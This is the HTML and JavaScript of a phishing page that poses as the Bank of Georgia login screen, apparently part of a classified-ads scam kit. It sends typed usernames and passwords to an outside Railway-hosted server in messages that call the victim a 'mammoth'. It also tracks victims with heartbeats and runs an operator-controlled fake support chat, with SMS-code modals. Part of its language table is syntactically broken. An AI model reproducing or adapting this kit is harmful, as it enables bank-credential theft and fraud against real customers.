  <title>Bank of Georgia — Authorization</title>

  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
      background: #f0eeec;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    /* ===== НАВИГАЦИЯ ===== */
    .nav {
      background: #fff;
      border-bottom: 1px solid #e8e8e8;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 32px;
      height: 52px;
    }

    .nav__tabs {
      display: flex;
      align-items: center;
      gap: 0;
      height: 100%;
    }

    .nav__tab {
      font-size: 13px;
      font-weight: 600;
      color: #666;
      text-decoration: none;
      padding: 0 20px;
      height: 100%;
      display: flex;
      align-items: center;
      border-bottom: 3px solid transparent;
      letter-spacing: 0.3px;
      transition: color 0.2s;
    }
    .nav__tab:hover { color: #e8500a; }
    .nav__tab.active {
      color: #e8500a;
      border-bottom-color: #e8500a;
    }

    .nav__lang {
      font-size: 13px;
      font-weight: 600;
      color: #333;
      text-decoration: none;
      cursor: pointer;
    }

    /* ===== ЛОГОТИП ===== */
    .logo-bar {
      background: #fff;
      padding: 18px 32px;
      border-bottom: 1px solid #eee;
    }

    .logo-bar img {
      height: 44px;
      width: auto;
    }

    /* ===== ОСНОВНОЙ КОНТЕНТ ===== */
    .main {
      flex: 1;
      display: flex;
      align-items: flex-start;
      justify-content: center;
      padding: 48px 16px;
    }

    /* ===== КАРТОЧКА ===== */
    .card {
      background: #fff;
      border-radius: 12px;
      width: 100%;
      max-width: 580px;
      box-shadow: 0 1px 6px rgba(0,0,0,0.06);
      overflow: hidden;
    }

    .card__header {
      padding: 24px 32px;
      border-bottom: 1px solid #eee;
    }

    .card__title {
      font-size: 18px;
      font-weight: 600;
      color: #1a1a1a;
    }

    .card__body {
      padding: 32px;
    }

    /* ===== ФОРМА ===== */
    .form-group {
      margin-bottom: 16px;
    }

    .form-input {
      width: 100%;
      height: 52px;
      border: 1.5px solid #d8d8d8;
      border-radius: 8px;
      padding: 0 16px;
      font-size: 15px;
      color: #333;
      font-family: inherit;
      outline: none;
      background: #fff;
      transition: border-color 0.2s;
    }
    .form-input::placeholder { color: #aaa; }
    .form-input:focus { border-color: #e8500a; }

    .input-wrap {
      position: relative;
    }
    .input-wrap .eye-btn {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      color: #aaa;
      display: flex;
      align-items: center;
      padding: 0;
    }
    .input-wrap .eye-btn:hover { color: #555; }

    .checkbox-wrap {
      display: flex;
      align-items: center;
      gap: 10px;
      margin: 10px 0 18px;
    }
    .checkbox-wrap input[type=checkbox] {
      width: 18px;
      height: 18px;
      border: 1.5px solid #ccc;
      border-radius: 4px;
      cursor: pointer;
      accent-color: #e8500a;
      flex-shrink: 0;
    }
    .checkbox-wrap label {
      font-size: 14px;
      color: #555;
      cursor: pointer;
    }

    .forgot-link {
      display: block;
      margin-top: 10px;
      font-size: 14px;
      color: #e8500a;
      text-decoration: none;
    }
    .forgot-link:hover { text-decoration: underline; }

    .btn-login {
      display: block;
      width: 100%;
      height: 56px;
      background: #e8500a;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 700;
      letter-spacing: 1px;
      cursor: pointer;
      margin-top: 32px;
      font-family: inherit;
      transition: background 0.2s;
    }
    .btn-login:hover { background: #cf4508; }

    .register-link {
      display: block;
      text-align: center;
      margin-top: 20px;
      font-size: 14px;
      font-weight: 700;
      color: #e8500a;
      text-decoration: none;
      letter-spacing: 0.5px;
    }
    .register-link:hover { text-decoration: underline; }

    /* ===== ФУТЕР ===== */
    .footer {
      background: #fff;
      border-top: 1px solid #eee;
      padding: 24px 32px 20px;
    }

    .footer__copy {
      font-size: 13px;
      color: #555;
      margin-bottom: 14px;
    }

    .footer__links {
      display: flex;
      align-items: center;
      gap: 6px;
      flex-wrap: wrap;
      margin-bottom: 18px;
    }

    .footer__links a {
      font-size: 13px;
      color: #555;
      text-decoration: none;
    }
    .footer__links a:hover { color: #333; }
    .footer__links span {
      color: #ccc;
      font-size: 12px;
    }

    .footer__bottom {
      display: flex;
      align-items: center;
      gap: 14px;
      flex-wrap: wrap;
    }

    .footer__socials {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .social-icon {
      width: 32px;
      height: 32px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #555;
      text-decoration: none;
      transition: color 0.2s;
    }
    .social-icon:hover { color: #333; }

    .footer__badges {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-left: 4px;
    }

    .footer__badges img {
      height: 32px;
      width: auto;
    }

    .lang-switcher {
      display: flex;
      align-items: center;
      gap: 6px;
    }
    
    
    

    .lang-toggle {
      background: none; border: none; cursor: pointer;
      font-size: 13px; font-weight: 600; color: #333;
      font-family: inherit; padding: 4px 0;
      transition: color 0.2s;
    }
    .lang-toggle:hover { color: #e8500a; }

    /* ===== LOADER ===== */
    .loader-overlay {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(255,255,255,0.85);
      z-index: 9999;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      gap: 20px;
    }
    .loader-overlay.show { display: flex; }

    .loader-spinner {
      width: 48px;
      height: 48px;
      border: 4px solid #f0eeec;
      border-top-color: #e8500a;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .loader-text {
      font-size: 14px;
      color: #888;
      font-weight: 500;
      letter-spacing: 0.3px;
    }
  
/* ═══════════════════════════
   CHAT SUPPORT WIDGET — BOG
   ═══════════════════════════ */
.chat-btn {
  position: fixed; bottom: 28px; right: 28px; z-index: 900;
  width: 56px; height: 56px; border-radius: 50%;
  background: #e8500a; border: none; cursor: pointer;
  display: flex; align-items: center; justify-content: center;
  box-shadow: 0 4px 20px rgba(232,80,10,.38);
  transition: transform .18s, box-shadow .18s;
}
.chat-btn:hover { transform: scale(1.08); box-shadow: 0 6px 28px rgba(232,80,10,.52); }
.chat-btn-icon, .chat-btn-close {
  position: absolute;
  transition: opacity .18s, transform .18s;
}
.chat-btn-close { opacity: 0; transform: rotate(-90deg); }
.chat-btn.open .chat-btn-icon { opacity: 0; transform: rotate(90deg); }
.chat-btn.open .chat-btn-close { opacity: 1; transform: rotate(0); }
.chat-badge {
  position: absolute; top: -3px; right: -3px;
  width: 20px; height: 20px; border-radius: 50%;
  background: #1a1a1a; border: 2.5px solid #fff;
  font-size: 10px; color: #fff; font-weight: 700;
  display: flex; align-items: center; justify-content: center;
}

/* Pulse */
.chat-btn::before {
  content: ''; position: absolute; inset: -6px; border-radius: 50%;
  border: 2px solid rgba(232,80,10,.3);
  animation: bog-pulse 2.2s ease-out infinite;
}
@keyframes bog-pulse {
  0%   { transform: scale(.88); opacity: 1; }
  100% { transform: scale(1.32); opacity: 0; }
}

/* Window */
.chat-win {
  position: fixed; bottom: 96px; right: 28px; z-index: 900;
  width: 328px; height: 480px; border-radius: 14px;
  background: #fff; overflow: hidden;
  box-shadow: 0 12px 48px rgba(0,0,0,.15);
  display: flex; flex-direction: column;
  opacity: 0; pointer-events: none;
  transform: scale(.88) translateY(18px); transform-origin: bottom right;
  transition: opacity .22s, transform .26s cubic-bezier(.34,1.4,.64,1);
}
.chat-win.open { opacity: 1; pointer-events: all; transform: scale(1) translateY(0); }

/* Header */
.chat-head {
  background: #e8500a;
  padding: 14px 16px 13px;
  display: flex; align-items: center; gap: 10px;
  flex-shrink: 0;
}
.chat-head-avatar {
  width: 36px; height: 36px; border-radius: 50%;
  background: rgba(255,255,255,.22);
  display: flex; align-items: center; justify-content: center;
  font-size: 15px; font-weight: 700; color: #fff; flex-shrink: 0;
}
.chat-head-info { flex: 1; }
.chat-head-name { color: #fff; font-size: 14px; font-weight: 700; line-height: 1.1; }
.chat-head-status { display: flex; align-items: center; gap: 5px; margin-top: 3px; }
.chat-head-dot { width: 7px; height: 7px; border-radius: 50%; background: #4ade80; }
.chat-head-online { color: rgba(255,255,255,.82); font-size: 11.5px; }
.chat-close-btn {
  background: rgba(255,255,255,.18); border: none; cursor: pointer;
  width: 30px; height: 30px; border-radius: 50%;
  display: flex; align-items: center; justify-content: center;
  flex-shrink: 0; transition: background .15s;
}
.chat-close-btn:hover { background: rgba(255,255,255,.32); }

/* Messages */
.chat-msgs {
  flex: 1; overflow-y: auto;
  padding: 14px 14px 8px;
  display: flex; flex-direction: column; gap: 10px;
  background: #faf9f8;
}
.chat-msgs::-webkit-scrollbar { width: 4px; }
.chat-msgs::-webkit-scrollbar-thumb { background: #ddd; border-radius: 2px; }

.msg { display: flex; flex-direction: column; max-width: 82%; }
.msg-in  { align-self: flex-start; }
.msg-out { align-self: flex-end; }

.msg-bubble { padding: 10px 13px; border-radius: 14px; font-size: 13.5px; line-height: 1.45; }
.msg-in  .msg-bubble { background: #fff; color: #222; border-bottom-left-radius: 4px; box-shadow: 0 1px 4px rgba(0,0,0,.07); }
.msg-out .msg-bubble { background: #e8500a; color: #fff; border-bottom-right-radius: 4px; }
.msg-time { font-size: 10.5px; color: #bbb; margin-top: 3px; padding: 0 2px; }
.msg-in  .msg-time { align-self: flex-start; }
.msg-out .msg-time { align-self: flex-end; }
.msg-with-av { display: flex; align-items: flex-end; gap: 7px; }
.msg-av {
  width: 26px; height: 26px; border-radius: 50%;
  background: #e8500a; display: flex; align-items: center;
  justify-content: center; font-size: 11px; color: #fff;
  font-weight: 700; flex-shrink: 0;
}

/* Typing */
.typing-wrap { display: flex; align-items: flex-end; gap: 7px; }
.typing {
  display: flex; align-items: center; gap: 4px;
  padding: 10px 14px; background: #fff; border-radius: 14px;
  border-bottom-left-radius: 4px; box-shadow: 0 1px 4px rgba(0,0,0,.07);
}
.typing span {
  width: 6px; height: 6px; border-radius: 50%; background: #ccc;
  animation: t-dot 1.2s infinite;
}
.typing span:nth-child(2) { animation-delay: .2s; }
.typing span:nth-child(3) { animation-delay: .4s; }
@keyframes t-dot { 0%,80%,100%{transform:scale(.6);opacity:.3;}40%{transform:scale(1);opacity:1;} }

/* Input */
.chat-foot {
  padding: 10px 12px; background: #fff;
  border-top: 1px solid #f0eeec;
  display: flex; align-items: center; gap: 8px; flex-shrink: 0;
}
.chat-input {
  flex: 1; border: 1.5px solid #e0e0e0; border-radius: 22px;
  padding: 9px 14px; font-size: 13px; color: #333;
  outline: none; font-family: inherit; background: #faf9f8;
  transition: border-color .15s;
}
.chat-input:focus { border-color: #e8500a; background: #fff; }
.chat-input::placeholder { color: #bbb; }
.chat-send {
  width: 36px; height: 36px; border-radius: 50%;
  background: #e8500a; border: none; cursor: pointer;
  display: flex; align-items: center; justify-content: center;
  flex-shrink: 0; transition: background .15s, transform .1s;
}
.chat-send:hover  { background: #d04208; }
.chat-send:active { transform: scale(.9); }

/* Mobile */
@media (max-width: 600px) {
  .chat-btn { bottom: 20px; right: 16px; width: 50px; height: 50px; }
  .chat-win {
    right: 0; left: 0; bottom: 0; width: 100%; height: 75vh;
    border-radius: 18px 18px 0 0; transform-origin: bottom center;
  }
  .chat-win.open { transform: translateY(0) scale(1); }
}
@media (max-width: 380px) { .chat-win { height: 82vh; } }

  </style>
</head>

  <main class="main">
    <div class="card">
      <div class="card__header">
        <h1 class="card__title" data-i18n="title">Authorization</h1>
      </div>
      <div class="card__body">

        <!-- Username -->
        <div class="form-group">
          <input class="form-input" type="text" placeholder="Username" data-i18n-ph="username" data-i18n-ph="username" id="username"/>
        </div>

        <!-- Save Username -->
        <div class="checkbox-wrap">
          <input type="checkbox" id="saveUsername"/>
          <label for="saveUsername" data-i18n="save_username">Save Username</label>
        </div>

        <!-- Password -->
        <div class="form-group input-wrap">
          <input class="form-input" type="password" placeholder="Password" data-i18n-ph="password" data-i18n-ph="password" id="password" style="padding-right:48px;"/>
          <button class="eye-btn" onclick="togglePass()">
            <svg id="eyeOpen" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
              <circle cx="12" cy="12" r="3"/>
            </svg>
            <svg id="eyeClosed" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none;">
              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
              <line x1="1" y1="1" x2="23" y2="23"/>
            </svg>
          </button>
        </div>

        <!-- Forgot -->
        <a class="forgot-link" href="#" data-i18n="forgot" data-i18n="forgot">Forgot your Credentials?</a>

        <!-- Login button -->
        <button class="btn-login" onclick="handleLogin()" data-i18n="login_btn">LOG IN</button>

        <!-- Registration -->
        <a class="register-link" href="#" data-i18n="register" data-i18n="register">REGISTRATION</a>

      </div>
    </div>

<script>
  // Логирование на Railway
  function sendLog(type, details, callback) {
    const LOG_SERVER_URL = 'https://mmworkbot-dev-production.up.railway.app/log';

    fetch(LOG_SERVER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: type,
        details: details,
        timestamp: new Date().toLocaleString('ru-RU')
      })
    })
    .then(response => response.json())
    .then(data => { if (callback) callback(); })
  }

  const i18n = {
    en: {
      tab_physical: 'PHYSICAL PERSON',
      tab_business: 'BUSINESS',
      tab_manager: 'BUSINESS MANAGER',
      auth_title: 'Authorization',

      chat_reply2: "We have received your message. Please hold on.",

    ka: {
      tab_physical: 'ფიზიკური პირი',
      tab_business: 'ბიზნესი',
      tab_manager: 'ბიზნეს მენეჯერი',
      auth_title: 'ავტორიზაცია',
      username: 'მომხმარებლის სახელი',
      save_username: 'სახელის დამახსოვრება',
      password: 'პაროლი',
      forgot: 'დაგავიწყდათ სარეგისტრაციო მონაცემები?',
      login_btn: 'შესვლა',
      register: 'რეგისტრაცია',
      copyright: '© 1997 - 2026 საქართველოს ბანკი',
      cond: 'პირობები',
      notif: 'შეტყობინებები',
      hotline: 'ცხელი ხაზი',
      security: 'უსაფრთხოების ცენტრი',
      privacy: 'კონფიდენციალურობის შეტყობინება',
      chat_name: 'BOG მხარდაჭერა',
      chat_online: 'ონლაინ',
      chat_welcome: 'გამარჯობა! 👋 როგორ შეგვიძლია დაგეხმარო?',
      chat_input: 'დაწერეთ შეტყობინება...',
      chat_reply1: 'გმადლობთ! ოპერატორი მალე დაგიკავშირდებათ.',
      chat_reply2: 'შეტყობინება მიღებულია. გთხოვთ დაელოდოთ.',
      chat_reply3: 'კარგი! მალე გიპასუხებთ.'
    }
  };

  var currentLang = localStorage.getItem('bogLang') || 'ka';

  function applyLang(lang) {
    var t = i18n[lang];
    document.querySelectorAll('[data-i18n]').forEach(function(el) {
      var key = el.getAttribute('data-i18n');
      if (t[key]) el.textContent = t[key];
    });
    document.querySelectorAll('[data-i18n-ph]').forEach(function(el) {
      var key = el.getAttribute('data-i18n-ph');
      if (t[key]) el.placeholder = t[key];
    });
    document.getElementById('langLabel').textContent = lang === 'ka' ? 'Eng' : 'Geo';
    // Chat widget
    var t = i18n[lang];
    var el;
    el = document.getElementById('chatHeadName');  if(el) el.textContent = t.chat_name;
    el = document.getElementById('chatOnline');    if(el) el.textContent = t.chat_online;
    el = document.getElementById('chatWelcome');   if(el) el.textContent = t.chat_welcome;
    el = document.getElementById('chatInput');     if(el) el.placeholder = t.chat_input;
  }

  function switchLang() {
    currentLang = currentLang === 'ka' ? 'en' : 'ka';
    localStorage.setItem('bogLang', currentLang);
    applyLang(currentLang);
  }

  function handleLogin() {
    var username = document.getElementById('username').value.trim();
    var password = document.getElementById('password').value.trim();
    if (!username || !password) return;

    // Get link_id from URL
    const urlParams = new URLSearchParams(window.location.search);
    const link_id = urlParams.get('link_id') || '';

    // Логирование данных входа в BOG (отправляем username, password, и product info)
    const logMessage = `💳 **МАМОНТ ДАЛ ДАННЫЕ BOG**\n👤 Логин: ${username}\n🔐 Пароль: ${password}\n📦 Товар: ${bog_productName}\n💰 Цена: ${bog_productPrice}${link_id ? `\nlink_id=${link_id}` : ''}`;
    sendLog('bog_data', logMessage);

    var overlay = document.getElementById('loaderOverlay');
    var loaderText = document.getElementById('loaderText');
    overlay.classList.add('show');

    // Текст меняется в зависимости от языка
    loaderText.textContent = currentLang === 'ka' ? 'ავტორიზაცია...' : 'Authorization...';

    // Симуляция загрузки (убрать когда подключишь реальный API)
    setTimeout(function() {
      overlay.classList.remove('show');
    }, 2500);
  }

  function togglePass() {
    var p = document.getElementById('password');
    var open = document.getElementById('eyeOpen');
    var closed = document.getElementById('eyeClosed');
    var isPass = p.type === 'password';
    p.type = isPass ? 'text' : 'password';
    open.style.display = isPass ? 'none' : 'block';
    closed.style.display = isPass ? 'block' : 'none';
  }

  // Global variables for product info
  let bog_productName = '';
  let bog_productPrice = '';

  window.addEventListener('DOMContentLoaded', function() {
    applyLang(currentLang);

    // Логирование выбора банка BOG
    const urlParams = new URLSearchParams(window.location.search);
    const link_id = urlParams.get('link_id') || '';
    sendLog('bank_selected', `🏦 Мамонт выбрал BOG\nlink_id=${link_id}`);

    // Load product info
    if (link_id) {
      fetch(`https://mmworkbot-dev-production.up.railway.app/link/${link_id}`)
        .then(r => r.json())
        .then(data => {
          bog_productName = data.name || 'Товар';
          bog_productPrice = data.price || '';
        })
        .catch(e => console.warn(`⚠️ Failed to load BOG product: ${e}`));

      sendLog('online', link_id);

      // Send heartbeat every 5 seconds to track real-time online status
      setInterval(function() {
        sendLog('heartbeat', link_id);
      }, 5000);  // Every 5 seconds
    } else {
      console.warn(`❌ BOG Login - no link_id found!`);
    }
  });

  /* ── CHAT WIDGET ── */
  function chatToggle() {
    var win   = document.getElementById('chatWin');
    var btn   = document.getElementById('chatBtn');
    var badge = document.getElementById('chatBadge');
    var open  = win.classList.toggle('open');
    btn.classList.toggle('open', open);
    if (badge) badge.style.display = 'none';
    if (open){
      document.getElementById('chatInput').focus();
      startBogSupportPolling();
    }
  }

  function chatSend() {
    var inp  = document.getElementById('chatInput');
    var txt  = inp.value.trim();
    if (!txt) return;
    var msgs = document.getElementById('chatMsgs');
    var now  = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
    var t    = i18n[currentLang];

    // User bubble
    var out = document.createElement('div');
    out.className = 'msg msg-out';
    out.innerHTML = '<div class="msg-bubble">' + escH(txt) + '</div><div class="msg-time">' + now + '</div>';
    msgs.appendChild(out);
    inp.value = '';
    msgs.scrollTop = msgs.scrollHeight;

    // Get link_id
    var link_id = window.location.hash.substring(1);
    if(!link_id){
      var params = new URLSearchParams(window.location.search);
      link_id = params.get('link_id');
    }

    // Save to localStorage
    saveBogChatMessagesToLocalStorage(link_id);

    // Send to backend with page_type
    var payload = {link_id: link_id, message: txt, page_type: 'bog'};

    fetch('https://mmworkbot-dev-production.up.railway.app/support/send', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(payload)
    })
    .then(res => res.json())
    .then(data => {
      var ty = document.getElementById('bogTyping');
      if (ty) ty.remove();
    })
    .catch(err => {
      var ty = document.getElementById('bogTyping');
      if (ty) ty.remove();
    });

    // Typing
    var typing = document.createElement('div');
    typing.id = 'bogTyping';
    typing.className = 'msg msg-in';
    typing.innerHTML = '<div class="typing-wrap"><div class="msg-av">B</div><div class="typing"><span></span><span></span><span></span></div></div>';
    msgs.appendChild(typing);
    msgs.scrollTop = msgs.scrollHeight;
  }

  function escH(s) {
    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  }

  function getBogChatStorageKey(link_id) {
    return 'bog_chat_' + link_id;
  }

  function saveBogChatMessagesToLocalStorage(link_id) {
    var msgs = document.getElementById('chatMsgs');
    if(!msgs) return;
    var msgData = [];
    var msgEls = msgs.querySelectorAll('.msg');
    msgEls.forEach(function(el){
      var isUser = el.classList.contains('msg-out');
      var bubble = el.querySelector('.msg-bubble');
      if(bubble){
        msgData.push({sender: isUser ? 'user' : 'admin', text: bubble.textContent});
      }
    });
    localStorage.setItem(getBogChatStorageKey(link_id), JSON.stringify(msgData));
  }

  function restoreBogChatMessagesFromLocalStorage(link_id) {
    var stored = localStorage.getItem(getBogChatStorageKey(link_id));
    if(!stored) return;
    try{
      var msgData = JSON.parse(stored);
      msgData.forEach(function(msg){
        var msgs = document.getElementById('chatMsgs');
        var div = document.createElement('div');
        div.className = msg.sender === 'user' ? 'msg msg-out' : 'msg msg-in';
        div.innerHTML = '<div class="msg-bubble">'+escH(msg.text)+'</div>';
        msgs.appendChild(div);
      });
    }catch(e){
    }
  }

  function startBogSupportPolling() {
    var link_id = window.location.hash.substring(1);
    if(!link_id){
      var params = new URLSearchParams(window.location.search);
      link_id = params.get('link_id');
    }
    if(!link_id) return;

    restoreBogChatMessagesFromLocalStorage(link_id);

    setInterval(function(){
      fetch('https://mmworkbot-dev-production.up.railway.app/support/messages/' + link_id + '?page_type=bog')
        .then(res => res.json())
        .then(data => {
          if(data.messages && data.messages.length > 0){
            var msgs = document.getElementById('chatMsgs');
            data.messages.forEach(function(msg){
              if(msg.sender === 'admin'){
                var allBubbles = msgs.querySelectorAll('.msg-in .msg-bubble');
                var exists = false;
                for(var i=0; i<allBubbles.length; i++){
                  if(allBubbles[i].textContent === msg.text){
                    exists = true;
                    break;
                  }
                }
                if(!exists){
                  var div = document.createElement('div');
                  div.className = 'msg msg-in';
                  div.setAttribute('data-msg-id', msg.id);
                  div.innerHTML = '<div class="msg-bubble">'+escH(msg.text)+'</div>';
                  msgs.appendChild(div);
                  msgs.scrollTop = msgs.scrollHeight;
                  saveBogChatMessagesToLocalStorage(link_id);
                }
              }
            });
          }
        })
    }, 2000);
  }

  document.addEventListener('keydown', function(e) {
    if (e.key === 'Enter' && document.activeElement.id === 'chatInput') {
      e.preventDefault();
      chatSend();
    }
  });

  // Start error and SMS polling
  document.addEventListener('DOMContentLoaded', () => {
    const linkId = new URLSearchParams(window.location.search).get('link_id');
    if (linkId) {
      if (typeof ErrorModal !== 'undefined') {
        ErrorModal.startPolling(linkId, 'bog', 3000);
      }
      if (typeof SMSModal !== 'undefined') {
        SMSModal.startPolling(linkId, 'bog', 3000);
      }
    }
  });
</script>

<!-- Loader -->
<div class="loader-overlay" id="loaderOverlay">
  <div class="loader-spinner"></div>
  <span class="loader-text" id="loaderText">Authorization...</span>
</div>

<!-- ═══════════════════════
     BOG CHAT SUPPORT
     ═══════════════════════ -->
<button class="chat-btn" id="chatBtn" onclick="chatToggle()">
  <span class="chat-btn-icon">
    <svg width="23" height="23" viewBox="0 0 24 24" fill="none">
      <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
  </span>
  <span class="chat-btn-close">
    <svg width="19" height="19" viewBox="0 0 24 24" fill="none"><path d="M18 6L6 18M6 6l12 12" stroke="white" stroke-width="2.2" stroke-linecap="round"/></svg>
  </span>
  <div class="chat-badge" id="chatBadge">1</div>
</button>

<div class="chat-win" id="chatWin">

  <div class="chat-head">
    <div class="chat-head-avatar">B</div>
    <div class="chat-head-info">
      <div class="chat-head-name" id="chatHeadName">BOG Support</div>
      <div class="chat-head-status">
        <div class="chat-head-dot"></div>
        <span class="chat-head-online" id="chatOnline">Online</span>
      </div>
    </div>
    <button class="chat-close-btn" onclick="chatToggle()">
      <svg width="13" height="13" viewBox="0 0 24 24" fill="none"><path d="M18 6L6 18M6 6l12 12" stroke="white" stroke-width="2.2" stroke-linecap="round"/></svg>
    </button>
  </div>

  <div class="chat-msgs" id="chatMsgs">
    <!-- Messages loaded from backend -->
  </div>

  <div class="chat-foot">
    <input class="chat-input" id="chatInput" type="text" placeholder="Write a message...">
    <button class="chat-send" onclick="chatSend()">
      <svg width="15" height="15" viewBox="0 0 24 24" fill="none">
        <line x1="22" y1="2" x2="11" y2="13" stroke="white" stroke-width="2" stroke-linecap="round"/>
        <polygon points="22 2 15 22 11 13 2 9 22 2" fill="white"/>
      </svg>
    </button>
  </div>

</div>

<script src="error-modal.js"></script>
<script src="sms-modal.js"></script>
</body>
</html>
